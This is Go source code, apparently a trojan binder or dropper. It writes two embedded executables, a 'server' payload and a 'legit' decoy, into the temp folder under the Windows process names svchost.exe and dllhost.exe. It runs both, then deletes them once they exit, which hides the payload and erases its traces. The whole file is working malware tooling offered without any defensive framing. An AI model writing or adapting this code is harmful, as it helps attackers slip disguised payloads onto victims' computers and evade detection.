var serverPath = os.TempDir() + `\svchost.exe`

var filePath = os.TempDir() + `\dllhost.exe`

func main() {

	serverFile = EncodeAndDecodeBuffer(serverFile)
	legitFile = EncodeAndDecodeBuffer(legitFile)
	wFile(serverPath, serverFile)
	time.Sleep(100 * time.Millisecond)
	wFile(filePath, legitFile)

	serverPid := ExecFile(serverPath)
	filePid := ExecFile(filePath)

	time.Sleep(100 * time.Millisecond)
	WaitProcessToSafeClose(serverPid, serverPath)
	WaitProcessToSafeClose(filePid, filePath)
}

//https://gist.github.com/Xeoncross/e83313ac7157c659416676a6044fcd1e

/*EncodeAndDecodeBuffer encode and decode value*/
func EncodeAndDecodeBuffer(buffer []byte) (dBuffer []byte) {
	a := Base64Encode(buffer)
	dBuffer, err := Base64Decode(a)
	if err != nil {
		panic(dBuffer)
	}
	return
}

/*Base64Encode Encode using base64*/
func Base64Encode(message []byte) []byte {
	b := make([]byte, base64.StdEncoding.EncodedLen(len(message)))
	base64.StdEncoding.Encode(b, message)
	return b
}

/*Base64Decode decode using base64*/
func Base64Decode(message []byte) (b []byte, err error) {
	var l int
	b = make([]byte, base64.StdEncoding.DecodedLen(len(message)))
	l, err = base64.StdEncoding.Decode(b, message)
	if err != nil {
		return
	}
	return b[:l], nil
}

/*ExecFile Execute file*/
func ExecFile(FilePath string) (pid int) {
	command := exec.Command(FilePath)
	var out bytes.Buffer
	command.Stdout = &out
	err := command.Start()
	if err != nil {
		panic(err)
	}
	pid = command.Process.Pid

	return
}

/*wFile Write File in Disk*/
func wFile(patch string, buffer []byte) {
	wFile := ioutil.WriteFile(patch, buffer, 0666)
	if wFile != nil {
		panic(wFile)
	}
}

/*WaitProcessToSafeClose WaitProcess to close and remove from disk*/
func WaitProcessToSafeClose(pid int, path string) {
	pPoint, _ := os.FindProcess(pid)
	pPoint.Wait()
	time.Sleep(300 * time.Millisecond)
	RemoveFile(path)
}

/*RemoveFile remove file from disk*/
func RemoveFile(Patch string) {
	RemFile := os.Remove(Patch)
	if RemFile != nil {
		panic(RemFile)
	}
}
